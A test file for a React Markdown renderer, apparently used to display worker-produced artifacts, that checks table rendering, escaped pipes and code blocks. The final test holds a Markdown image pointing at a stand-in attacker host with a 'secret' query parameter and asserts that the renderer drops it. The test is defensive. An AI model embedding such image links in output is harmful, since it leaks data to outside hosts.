import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { WallMarkdown } from "./markdown";

test("artifact Markdown renders a table with a scrollable container", () => {
  const html = renderToStaticMarkup(
    <WallMarkdown>{"| Dimension | Status |\n| --- | --- |\n| Tests | **clean** |"}</WallMarkdown>,
  );

  expect(html).toContain('<div class="wall-table-scroll"><table>');
  expect(html).toContain("<thead><tr><th>Dimension</th><th>Status</th></tr></thead>");
  expect(html).toContain("<tbody><tr><td>Tests</td><td><strong>clean</strong></td></tr></tbody>");
});

test("escaped pipes remain inside one table cell", () => {
  const html = renderToStaticMarkup(
    <WallMarkdown>{String.raw`| Dimension | Reason |
| --- | --- |
| Plan | path \\\| state |`}</WallMarkdown>,
  );

  expect(html).toContain("<tbody><tr><td>Plan</td><td>path \\| state</td></tr></tbody>");
});

test("fenced callgraphs keep their indentation and line breaks", () => {
  const html = renderToStaticMarkup(
    <WallMarkdown>{"```text\nroot\n  child\n    leaf\n| code | not a table |\n```"}</WallMarkdown>,
  );

  expect(html).toContain("<pre><code");
  expect(html).toContain("root\n  child\n    leaf\n| code | not a table |");
  expect(html).not.toContain("<table>");
});

test("an image in an artifact renders as its alt text, so the page fetches nothing a worker named", () => {
  const html = renderToStaticMarkup(
    <WallMarkdown>{"Result: ![the chart](https://attacker.example/c.png?d=secret)"}</WallMarkdown>,
  );

  expect(html).not.toContain("<img");
  expect(html).not.toContain("attacker.example");
  expect(html).toContain("the chart");
});
